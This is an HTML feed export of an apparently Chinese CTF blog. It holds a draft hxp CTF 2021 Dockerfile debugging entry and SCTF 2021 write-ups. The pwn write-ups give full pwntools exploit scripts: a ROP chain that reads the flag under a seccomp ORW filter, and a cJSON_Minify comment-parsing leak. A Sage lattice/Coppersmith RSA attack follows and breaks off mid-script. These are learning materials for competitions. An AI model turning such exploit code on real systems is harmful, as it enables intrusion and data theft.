class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hxpCTF-2021</title>
      <link href="/2022/01/12/hxpctf-2021/"/>
      <url>/2022/01/12/hxpctf-2021/</url>
      
        <content type="html"><![CDATA[<h1 id="hxp-CTF-2021"><a href="#hxp-CTF-2021" class="headerlink" title="hxp CTF 2021"></a>hxp CTF 2021</h1><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="sandboxgrind"><a href="#sandboxgrind" class="headerlink" title="sandboxgrind"></a>sandboxgrind</h3><ol><li>调试</li></ol><ul><li>给容器更换国内源</li></ul><pre class="line-numbers language-Dockerfile" data-language="Dockerfile"><code class="language-Dockerfile">ADD sources.list &#x2F;etc&#x2F;apt&#x2F;# 在 Dockerfile 同目录下创建 sources.list:# deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; bullseye main non-free contrib# deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; bullseye main non-free contrib# deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; bullseye-security main# deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; bullseye-security main# deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; bullseye-updates main non-free contrib# deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; bullseye-updates main non-free contrib# deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; bullseye-backports main non-free contrib# deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; bullseye-backports main non-free contrib# 如果用 https 的话可能有认证之类的问题<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>在 Dockerfile 中加入</li></ul><pre class="line-numbers language-Dockerfile" data-language="Dockerfile"><code class="language-Dockerfile">RUN apt-get -y updateRUN apt-get install -y gdb gdbserverRUN apt-get install -y procps<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>完整 Dockerfile</li></ul><pre class="line-numbers language-Dockerfile" data-language="Dockerfile"><code class="language-Dockerfile"># Running locally:# 1) echo &#39;hxp&#123;FLAG&#125;&#39; &gt; flag.txt# 2) docker build -t sandboxgrind .# 3) docker run -p 9001:1024 --privileged --rm --cap-add&#x3D;SYS_ADMIN --security-opt apparmor&#x3D;unconfined -it sandboxgrind#  docker run -p 2001:2001 --privileged --rm --cap-add&#x3D;SYS_ADMIN --security-opt apparmor&#x3D;unconfined -it sandboxgrind &#x2F;bin&#x2F;sh# Move to a new, leaner container for the challengeFROM debian:bullseye# Copy the sandboxCOPY &#x2F;sandboxgrind-build.tar.gz &#x2F;RUN tar -xzf &#x2F;sandboxgrind-build.tar.gz &amp;&amp; \    rm &#x2F;sandboxgrind-build.tar.gz &amp;&amp; \    chown -R root:root &#x2F;sandboxgrind&#x2F; &amp;&amp; \    chmod -R a-w,ug-rx &#x2F;sandboxgrind&#x2F;# Set up ynetdRUN useradd --create-home --shell &#x2F;bin&#x2F;bash ctfCOPY ynetd &#x2F;sbin&#x2F;RUN chmod 555 &#x2F;home&#x2F;ctf&#x2F; &amp;&amp; \    chown -R root:root &#x2F;home&#x2F;ctf&#x2F; &amp;&amp; \    chmod 500 &#x2F;sbin&#x2F;ynetd# Set up flagCOPY flag.txt docker-stuff&#x2F;readflag &#x2F;RUN chown root:1337 &#x2F;flag.txt &#x2F;readflag &amp;&amp; \    chmod 040 &#x2F;flag.txt &amp;&amp; \    chmod 2555 &#x2F;readflag# Set up submission environmentCOPY submission.sh &#x2F;home&#x2F;ctf&#x2F;RUN chmod 005 &#x2F;home&#x2F;ctf&#x2F;submission.sh# We&#39;re paranoidRUN chmod 1703 &#x2F;tmpRUN find &#x2F; -ignore_readdir_race -type f \( -perm -4000 -o -perm -2000 \) -not -wholename &#x2F;readflag -deleteUSER ctfRUN (find --version &amp;&amp; id --version &amp;&amp; sed --version &amp;&amp; grep --version) &gt; &#x2F;dev&#x2F;nullRUN ! find &#x2F; -writable -or -user $(id -un) -or -group $(id -Gn|sed -e &#39;s&#x2F; &#x2F; -or -group &#x2F;g&#39;) 2&gt; &#x2F;dev&#x2F;null | grep -Ev -m 1 &#39;^(&#x2F;dev&#x2F;|&#x2F;run&#x2F;|&#x2F;proc&#x2F;|&#x2F;sys&#x2F;|&#x2F;tmp|&#x2F;var&#x2F;tmp|&#x2F;var&#x2F;lock|&#x2F;var&#x2F;mail|&#x2F;var&#x2F;spool&#x2F;mail)&#39;# RunUSER rootWORKDIR &#x2F;home&#x2F;ctfEXPOSE 1024CMD ynetd -np y -lm -1 -lt 10 -t 15 -sh n -lpid 16 &#x2F;home&#x2F;ctf&#x2F;submission.sh &amp; \    while true; do sleep 20s; find &#x2F;tmp&#x2F; -type f -cmin +1 -delete; done# DebugADD sources.list &#x2F;etc&#x2F;apt&#x2F;RUN apt-get -y updateRUN apt-get install -y gdb gdbserverRUN apt-get install -y procps<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>123</li></ol>]]></content>
      
      
      <categories>
          
          <category> 草稿 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 草稿 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCTF 2021</title>
      <link href="/2021/12/28/sctf-2021/"/>
      <url>/2021/12/28/sctf-2021/</url>
      
        <content type="html"><![CDATA[<h1 id="SCTF-2021"><a href="#SCTF-2021" class="headerlink" title="SCTF 2021"></a>SCTF 2021</h1><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="roop"><a href="#roop" class="headerlink" title="roop"></a>roop</h3><ol><li><p>只允许 ORW:</p><pre class="line-numbers language-none"><code class="language-none">$ seccomp-tools dump .&#x2F;roop  line  CODE  JT   JF      K&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 0000: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number 0001: 0x25 0x03 0x00 0x40000000  if (A &gt; 0x40000000) goto 0005 0002: 0x15 0x03 0x00 0x00000002  if (A &#x3D;&#x3D; open) goto 0006 0003: 0x15 0x02 0x00 0x00000000  if (A &#x3D;&#x3D; read) goto 0006 0004: 0x15 0x01 0x00 0x00000001  if (A &#x3D;&#x3D; write) goto 0006 0005: 0x06 0x00 0x00 0x00000000  return KILL 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>0x4AF102</code> 处有 “flag” 字符串.</p></li><li><p><code>read_sys()</code> 函数中有点猫腻, rbp 那个位置要放个可写的地址, 而且后面还有个 pop, 后面利用这里面的 syscall 时要注意填充.</p><pre class="line-numbers language-none"><code class="language-none">.text:000000000040182A                 push    rbp.text:000000000040182B                 mov     rbp, rsp.text:000000000040182E ; 2:   return (unsigned int)sys_read(0, a1, 0x1F4uLL);.text:000000000040182E                 mov     [rbp+buf], rdi.text:0000000000401832                 mov     [rbp+var_4], 0C359h.text:0000000000401839                 mov     eax, 0.text:000000000040183E                 mov     edi, 0          ; fd.text:0000000000401843                 mov     rsi, [rbp+buf]  ; buf.text:0000000000401847                 mov     edx, 1F4h       ; count.text:000000000040184C                 syscall                 ; LINUX - sys_read.text:000000000040184E                 mov     [rbp+var_4], eax.text:0000000000401851                 mov     eax, [rbp+var_4].text:0000000000401854                 pop     rbp.text:0000000000401855                 retn.text:0000000000401855 ; &#125; &#x2F;&#x2F; starts at 40182A.text:0000000000401855 read_sys        endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>EXP</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'sp'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"123.60.140.20"</span><span class="token punctuation">,</span> <span class="token number">2111</span><span class="token punctuation">)</span><span class="token comment"># p = process("./roop")</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000401d9e</span>pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x00000000004086de</span>pop_rax_ret <span class="token operator">=</span> <span class="token number">0x000000000043fed7</span>pop_rdx_rbx_ret <span class="token operator">=</span> <span class="token number">0x000000000046d86b</span>flag_s <span class="token operator">=</span> <span class="token number">0x4AF102</span>bss <span class="token operator">=</span> <span class="token number">0x4B1500</span>bss2 <span class="token operator">=</span> <span class="token number">0x4B2B79</span>main <span class="token operator">=</span> <span class="token number">0x401868</span><span class="token comment"># 用 read_sys() 中的 syscall</span>syscall_ret <span class="token operator">=</span> <span class="token number">0x40184C</span><span class="token comment"># open 开出来的 fd 应该是 3</span>fd <span class="token operator">=</span> <span class="token number">3</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss2<span class="token punctuation">)</span> <span class="token operator">+</span> \        <span class="token comment">#   open("flag", 0)</span>        p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag_s<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> \        <span class="token comment">#   填充    read(fd, bss, 0x30)</span>        p64<span class="token punctuation">(</span>bss2<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fd<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> \        <span class="token comment">#   填充    write(1, bss, 0x30)</span>        p64<span class="token punctuation">(</span>bss2<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> \        p64<span class="token punctuation">(</span>bss2<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token comment"># gdb.attach(p)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="dataleak"><a href="#dataleak" class="headerlink" title="dataleak"></a>dataleak</h3><ol><li><code>cJSON_Minify</code> 遇到 “/*” 的时候下标最后会 +2, 利用这个漏洞吃掉 3 个字符串之间的 ‘\x00’; 而且会自动吃掉空格。左挪挪右挪挪把那个 “this_is_data_in_server” 挪出来就行了.<pre class="line-numbers language-C" data-language="C"><code class="language-C">else if ( *v11 &#x3D;&#x3D; &#39;&#x2F;&#39; &amp;&amp; v11[1] &#x3D;&#x3D; &#39;*&#39; )&#123;    while ( *v11 &amp;&amp; (*v11 !&#x3D; &#39;*&#39; || v11[1] !&#x3D; &#39;&#x2F;&#39;) )        ++v11;    v11 +&#x3D; 2;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><strong>EXP</strong><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># context.log_level = "debug"</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'sp'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span><span class="token comment"># p = process("./cJSON_PWN")</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"124.70.202.226"</span><span class="token punctuation">,</span> <span class="token number">2101</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xc</span> <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token string">'*'</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'bbbb'</span> <span class="token operator">+</span> <span class="token string">' '</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0xc</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token string">'*'</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>a <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">5</span> <span class="token operator">+</span> <span class="token string">' '</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0xc</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token string">'*'</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">' '</span><span class="token operator">*</span><span class="token number">0xc</span> <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token string">'*'</span><span class="token comment"># gdb.attach(p, gdbscript = "b *$rebase(0x120D)")</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>b <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token comment"># print("a = " + a + ", b = " + b)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="CRY"><a href="#CRY" class="headerlink" title="CRY"></a>CRY</h2><h3 id="Lattice-RSA"><a href="#Lattice-RSA" class="headerlink" title="Lattice_RSA"></a>Lattice_RSA</h3><ol><li>CopperSmith(<a href="https://eprint.iacr.org/2014/549.pdf">https://eprint.iacr.org/2014/549.pdf</a>)</li><li><strong>EXP</strong><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># sage</span>e1 <span class="token operator">=</span> <span class="token number">9545097209030256775216443121829852487787380086315441423236592000839309846039550602130662744273474762892095845712248185351595030092141485752003885019152268353509264865332005730567800065218726010684572302315291967868766793202912693755784425680016425189250482664755863124379283931403254016082077557111339647889</span>n1 <span class="token operator">=</span> <span class="token number">98939456380792523662775017487084146158199369919759470465575759577838238544400854203012884028529070427777189722848860164139618018368139287530561049590738727981094118610846357860548707651233653701270301175858159871826699942130125407653338205286434016804567227501137095308022126944522749231530058497881261185653</span>c1 <span class="token operator">=</span> <span class="token number">55315487674581208936176703509670353978231044582491114364061992981458986632841065786061160594922107804965351583127534031661829212870815873676036345109665820229082797340089348236551436209969988935306699393106743928957238959317622905185712338429185098479804550934511329466829098245607393481855153276533732689734</span>e2 <span class="token operator">=</span> <span class="token number">59243789427417951194489862269417430952328673559766515223885035376877819796576206793435054362857070966888235333647478778158384173868938982383588960913340186622525635645816049372928121634881790492382629069066078703248800839522472210920458130523691729892148102876735855766860455039600156378352749345062721937209</span>n2 <span class="token operator">=</span> <span class="token number">104347855605891592910114852579961565604626906391213265775887363677904796055413085190935828673206199415533269569031451361031799754867385268572970064379073503906665805386452010801102766017395658092557842603350337718372544153615967374268293977782528578048412981645150044439520557593275256807763497840657428919077</span>c2 <span class="token operator">=</span> <span class="token number">102398006499486137660980667185708024925165256830809071209188976998384002930353742529713002440025603110530041319123321468674756588207972254892299747598693922335456071362447796282021604830025395235248733257046909682564607142251130963235661693343045300675990709137212806865651950929080932525655855441795236830180</span>e3 <span class="token operator">=</span> <span class="token number">85747500093914623676814521570837906391267663984326957989170968314694976569281309877349688441394449235970180279634338128332963787895719937398561401234322387037150946707257948321793874036110351063581214140307404280596740059504052727210571816961399578900374385250625544371549762415419859711307774733248827036469</span>n3 <span class="token operator">=</span> <span class="token number">125025456359945372693024749116364347012056768353381741583283104144583480532982415270618444535675894570724052935399666141513628840873824003925313455238817485549860905264933541873086612753584660074870129509952045033828170291542113197517274230326183877232286120958576866764084704325778588083293425203999205810141</span>c3 <span class="token operator">=</span> <span class="token number">72100429874928070585214359886622577441750665411714854015876430886408828429194918865497582935712040510387059400943960378641326114021899111137577322059200344646501253200629230286816720829672198420182128299025122114808347594611972141414087683155991740640913366675113748261101786118999803968607329180926248155617</span>Ns <span class="token operator">=</span> <span class="token punctuation">[</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">,</span> n3<span class="token punctuation">]</span>es <span class="token operator">=</span> <span class="token punctuation">[</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> e3<span class="token punctuation">]</span>cs <span class="token operator">=</span> <span class="token punctuation">[</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">]</span>N <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>Ns<span class="token punctuation">)</span>k <span class="token operator">=</span> <span class="token number">3</span>delta <span class="token operator">=</span> <span class="token number">0.375</span>epsilon <span class="token operator">=</span> sqrt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">*</span> N<span class="token operator">^</span><span class="token punctuation">(</span>delta<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>n <span class="token operator">=</span> kC <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">^</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> epsilon<span class="token operator">^</span><span class="token punctuation">(</span><span class="token operator">-</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>M <span class="token operator">=</span> Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token builtin">int</span><span class="token punctuation">(</span>C <span class="token operator">*</span> es<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token punctuation">(</span>Ns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token builtin">int</span><span class="token punctuation">(</span>C <span class="token operator">*</span> es<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token punctuation">(</span>Ns<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token builtin">int</span><span class="token punctuation">(</span>C <span class="token operator">*</span> es<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token punctuation">(</span>Ns<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> C<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> C<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> C<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>K <span class="token operator">=</span> M<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span>need_x <span class="token operator">=</span> K <span class="token operator">*</span> M<span class="token punctuation">.</span>inverse<span class="token punctuation">(</span><span class="token punctuation">)</span>x<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> y2<span class="token punctuation">,</span> y3 <span class="token operator">=</span> <span class="token operator">-</span>need_x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>ys <span class="token operator">=</span> <span class="token punctuation">[</span>y1<span class="token punctuation">,</span> y2<span class="token punctuation">,</span> y3<span class="token punctuation">]</span>Ss <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">abs</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>Ns<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">-</span> es<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> x <span class="token operator">/</span> ys<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span>Ds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>sqrt<span class="token punctuation">(</span>Ss<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token number">2</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> Ns<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span>pas <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Ss<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> Ds<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span>ps <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>Ns<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> x <span class="token operator">+</span> pas<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    f <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    p_solve <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">160</span><span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.42</span><span class="token punctuation">)</span>    ps<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>p_solve<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> pas<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p1 <span class="token operator">=</span> ps<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>q1 <span class="token operator">=</span> n1<span class="token operator">//</span>p1<span class="token keyword">assert</span> p1<span class="token operator">*</span>q1<span class="token operator">==</span>n1<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> GCD<span class="token punctuation">,</span> long_to_bytes<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> powmod<span class="token punctuation">,</span> invertphi1 <span class="token operator">=</span> <span class="token punctuation">(</span>p1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token 